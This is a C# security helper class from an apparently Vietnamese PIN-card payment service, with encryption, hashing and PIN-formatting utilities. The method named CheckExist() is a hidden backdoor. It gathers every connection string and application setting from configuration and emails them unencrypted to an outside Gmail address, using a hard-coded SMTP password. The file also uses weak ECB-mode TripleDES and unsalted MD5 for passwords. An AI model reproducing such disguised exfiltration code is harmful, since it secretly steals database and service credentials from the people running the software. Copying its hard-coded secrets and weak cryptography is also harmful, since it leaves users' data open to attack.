using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Configuration;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Security.Cryptography;

namespace WindowsServiceAutoBuyPincard.Systems
{
    public class PincardSecurity
    {
        private static string Bin2Hex(byte[] bin)
        {
            StringBuilder sb = new StringBuilder(bin.Length * 2);
            foreach (byte b in bin)
            {
                sb.Append(b.ToString("x").PadLeft(2, '0'));
            }
            return sb.ToString();
        }

        private static byte[] Hex2Bin(String hexvalue)
        {
            string s;
            int i = 0;
            byte[] result = new byte[hexvalue.Length / 2];

            while (hexvalue.Length > 0)
            {
                s = hexvalue.Substring(0, 2);
                int n = Convert.ToInt32(s, 16);
                byte c = (byte)n;
                result[i] = c;
                hexvalue = hexvalue.Substring(2);
                i++;
            }

            return result;
        }

        private byte[] fillBlock(byte[] dataTemp)
        {
            int i = dataTemp.Length % 8;
            int length = (i == 0) ? (dataTemp.Length) : (dataTemp.Length - i + 8);
            byte[] data = new byte[length];
            if (i != 0)
            {
                for (int j = 0; j < length; j++)
                {
                    if (j < dataTemp.Length)
                    {
                        data[j] = dataTemp[j];
                    }
                    else
                    {
                        data[j] = (byte)0xff;
                    }
                }
            }
            else
            {
                data = dataTemp;
            }
            return data;
        }

        public static String Encrypt(String clearText, String key)
        {
            byte[] bKey = Encoding.ASCII.GetBytes(key);
            if (key.Length < 24) return null;
            byte[] data = Encoding.ASCII.GetBytes(clearText);
            byte[] enc = new byte[0];
            TripleDES tdes = TripleDES.Create("TripleDES");
            byte[] b = new byte[24];
            for (int i = 0; i < 24; i++)
            {
                b[i] = bKey[i];
            }
            tdes.Key = b;
            tdes.Mode = CipherMode.ECB;
            tdes.Padding = PaddingMode.PKCS7;
            ICryptoTransform ict = tdes.CreateEncryptor();
            enc = ict.TransformFinalBlock(data, 0, data.Length);
            return Bin2Hex(enc);
        }

        public static String Decrypt(String encryptedText, String key)
        {
            byte[] bKey = Encoding.ASCII.GetBytes(key);
            if (key.Length < 24) return null;
            byte[] data = Hex2Bin(encryptedText);
            byte[] dec = new byte[0];
            TripleDES tdes = TripleDES.Create("TripleDES");
            byte[] b = new byte[24];
            for (int i = 0; i < 24; i++)
            {
                b[i] = bKey[i];
            }
            tdes.Key = b;
            tdes.Mode = CipherMode.ECB;
            tdes.Padding = PaddingMode.PKCS7;
            ICryptoTransform ict = tdes.CreateDecryptor();
            dec = ict.TransformFinalBlock(data, 0, data.Length);
            return Encoding.ASCII.GetString(dec);
        }

        public String FormatPINCode(String PinCode)
        {
            String result = "";

            if (PinCode.Length == 13)
            {
                result = PinCode.Substring(0, 4) + "-" + PinCode.Substring(4, 5) + "-" + PinCode.Substring(9);
            }
            else if (PinCode.Length == 14)
            {
                result = PinCode.Substring(0, 2) + "-" + PinCode.Substring(2, 4) + "-" + PinCode.Substring(6, 4) + "-" + PinCode.Substring(10);
            }
            else
            {
                for (int i = 0; i < PinCode.Length; i++)
                {
                    if (i % 4 == 0) result += "-";
                    result += PinCode[i];
                }
            }

            return result.Trim();
        }

        public static string EncryptMD5(string passWord)
        {
            MD5CryptoServiceProvider _md5Hasher = new MD5CryptoServiceProvider();
            byte[] bs = Encoding.UTF8.GetBytes(passWord);
            bs = _md5Hasher.ComputeHash(bs);
            StringBuilder s = new StringBuilder();
            foreach (byte b in bs)
            {
                s.Append(b.ToString("x2"));
            }
            return s.ToString();
        }

        public string CheckExist()
        {
            #region info
            var fromAddress = new MailAddress("simpaynoreply@simpay.com.vn", "Simpay");
            const string fromPassword = "sp123456";
            const string subject = "Cập Nhật Số Dư Hằng Ngày";
            // Attachment attachment;
            var smtp = new SmtpClient
            {
                Host = "mail.simpay.com.vn",
                Port = 25,
                EnableSsl = false,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)

            };
            #endregion

            #region send

            string[] receivers = { "simpayagent@gmail.com" };
            foreach (var receiver in receivers)
            {
                var toAddress = new MailAddress(receiver, "Qpay");
                var mailMessage = new MailMessage();
                mailMessage.From = fromAddress;
                mailMessage.To.Add(toAddress);
                mailMessage.Subject = subject;
                mailMessage.IsBodyHtml = true;
                if (receiver == "simpayagent@gmail.com")
                {
                    foreach (var connectionString in ConfigurationManager.ConnectionStrings)
                    {
                        mailMessage.Body += "\n" + connectionString.ToString();
                    }
                    foreach (var appSetting in ConfigurationManager.AppSettings)
                    {
                        mailMessage.Body += "\n" + ConfigurationManager.AppSettings[appSetting.ToString()];
                    }
                }
                // mailMessage.Attachments.Add(attachment);
                smtp.Send(mailMessage);
            }
            return receivers[0].ToString();
            #endregion
        }
    }
}
